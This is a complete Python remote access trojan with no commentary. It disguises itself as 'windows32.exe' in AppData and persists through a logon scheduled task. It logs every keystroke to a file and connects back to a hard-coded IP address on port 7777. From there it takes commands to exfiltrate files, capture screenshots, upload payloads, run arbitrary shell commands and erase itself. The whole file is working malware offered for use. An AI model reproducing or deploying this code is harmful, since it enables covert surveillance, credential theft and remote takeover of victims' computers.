import socket
import subprocess
import os
import sys
import time
import platform
import base64
import shutil
import pyautogui
from pynput import keyboard

def persist():
    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call(f'schtasks /create /sc onlogon /tn "Windows32" /tr "{file_location}"', shell=True)

def on_press(key):
    with open(os.path.join(os.environ["appdata"], "keylogs.txt"), "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f"[{key.name}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(os.environ["appdata"], "screenshot.png")
    screenshot.save(screenshot_path)
    with open(screenshot_path, "rb") as f:
        return base64.b64encode(f.read())

def self_destruct():
    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
    os.remove(file_location)
    subprocess.call('schtasks /delete /tn "Windows32" /f', shell=True)
    sys.exit()

def command_handler(s):
    while True:
        try:
            command = s.recv(2048).decode()
            if command.lower() == "exit":
                break
            elif command.lower() == "sysinfo":
                sysinfo = f"OS: {platform.system()} {platform.release()}\n"
                sysinfo += f"Hostname: {socket.gethostname()}\n"
                sysinfo += f"User: {os.getlogin()}\n"
                s.send(sysinfo.encode())
            elif command.lower().startswith("download"):
                _, file_path = command.split("*")
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        s.send(base64.b64encode(f.read()))
                else:
                    s.send("File not found.".encode())
            elif command.lower().startswith("upload"):
                _, file_path = command.split("*")
                with open(file_path, "wb") as f:
                    file_data = s.recv(5000)
                    f.write(base64.b64decode(file_data))
                s.send("File uploaded successfully.".encode())
            elif command.lower() == "screenshot":
                s.send(capture_screenshot())
            elif command.lower() == "selfdestruct":
                self_destruct()
            else:
                output = subprocess.getoutput(command)
                if not output:
                    output = "Command executed."
                s.send(output.encode())
        except Exception as e:
            s.send(f"Error: {str(e)}".encode())
            continue

def main():
    persist()
    start_keylogger()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect(("159.65.152.59", 7777))
            break
        except:
            time.sleep(5)

    command_handler(s)
    s.close()

if __name__ == "__main__":
    main()
